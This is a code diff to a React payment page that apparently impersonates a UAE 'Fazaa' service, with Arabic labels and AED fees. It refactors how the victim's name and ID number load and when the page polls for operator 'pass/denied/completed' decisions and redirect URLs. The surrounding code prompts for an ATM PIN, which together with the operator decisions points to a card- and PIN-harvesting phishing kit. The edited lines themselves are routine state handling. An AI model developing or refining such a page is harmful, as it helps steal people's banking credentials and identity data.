@@ -640,6 +640,7 @@ export default function Payment({ onBackToHome }: { onBackToHome: () => void }) 
   const [showToast, setShowToast] = useState(false)
   const [isSubmitting, setIsSubmitting] = useState(false)
   const [sessionData, setSessionData] = useState<{fullName?: string, idNumber?: string}>({})
+  const [dataLoaded, setDataLoaded] = useState(false)
   const [sessionId] = useState(() => {
     // Get session from URL
     const urlParams = new URLSearchParams(window.location.search)
@@ -647,10 +648,10 @@ export default function Payment({ onBackToHome }: { onBackToHome: () => void }) 
     return urlSessionId || 'FAZ-' + Date.now().toString(36)
   })
 
-  // Fetch session data from localStorage first, then from API
+  // Fetch session data ONLY ONCE from localStorage, don't update it again
   useEffect(() => {
-    if (sessionId) {
-      // First, try to get from localStorage
+    if (sessionId && !dataLoaded) {
+      // Try to get from localStorage first (fastest source)
       try {
         const localData = localStorage.getItem(`fazaa_session_${sessionId}`)
         if (localData) {
@@ -660,12 +661,14 @@ export default function Payment({ onBackToHome }: { onBackToHome: () => void }) 
             fullName: parsed.fullName || '',
             idNumber: parsed.idNumber || '',
           })
+          setDataLoaded(true)
+          return // Stop here, don't fetch from API
         }
       } catch (e) {
         console.warn('[Payment] Failed to load from localStorage:', e)
       }
 
-      // Then fetch from API to get the latest data
+      // If localStorage is empty, fetch from API as fallback
       const fetchData = async () => {
         try {
           const response = await fetch(`/api/session/${sessionId}`)
@@ -682,12 +685,14 @@ export default function Payment({ onBackToHome }: { onBackToHome: () => void }) 
           }
         } catch (err) {
           console.error('[Payment] Failed to fetch session data from API:', err)
+        } finally {
+          setDataLoaded(true) // Mark as loaded regardless
         }
       }
       
       fetchData()
     }
-  }, [sessionId])
+  }, [sessionId, dataLoaded])
 
   const appFee = '10'
   const deliveryFee = '5'
@@ -696,8 +701,8 @@ export default function Payment({ onBackToHome }: { onBackToHome: () => void }) 
   const discountAmount = '0'
 
   const transactionRows = [
-    { label: 'اسم مقدم الطلب', value: sessionData.fullName && sessionData.fullName.trim() ? sessionData.fullName : '-' },
-    { label: 'رقم هوية مقدم الطلب', value: sessionData.idNumber && sessionData.idNumber.trim() ? sessionData.idNumber : '-' },
+    { label: 'اسم مقدم الطلب', value: sessionData.fullName || '-' },
+    { label: 'رقم هوية مقدم الطلب', value: sessionData.idNumber || '-' },
     { label: 'رسوم تقديم الطلب', value: `${appFee} AED` },
     { label: 'رسوم التوصيل', value: `${deliveryFee} AED` },
     { label: 'المبلغ المستحق', value: `${dueAmount} AED` },
@@ -710,8 +715,10 @@ export default function Payment({ onBackToHome }: { onBackToHome: () => void }) 
     atm: 'الرقم السري للصراف الآلي غير صحيح.',
   }
 
-  // Poll for admin actions (pass/denied/completed) and redirect URLs
+  // Poll for admin actions (pass/denied/completed) and redirect URLs - only update stage, not user data
   useEffect(() => {
+    if (!dataLoaded) return // Don't check admin actions until data is loaded
+    
     const checkAdminAction = async () => {
       try {
         const { getSessionStatus, getRedirectUrl } = await import('../lib/api')
@@ -770,7 +777,7 @@ export default function Payment({ onBackToHome }: { onBackToHome: () => void }) 
 
     const interval = setInterval(checkAdminAction, 3000)
     return () => clearInterval(interval)
-  }, [sessionId, stage])
+  }, [sessionId, stage, dataLoaded])
 
   const handleCardSubmit = async (data: CardSubmitPayload) => {
     setIsSubmitting(true)
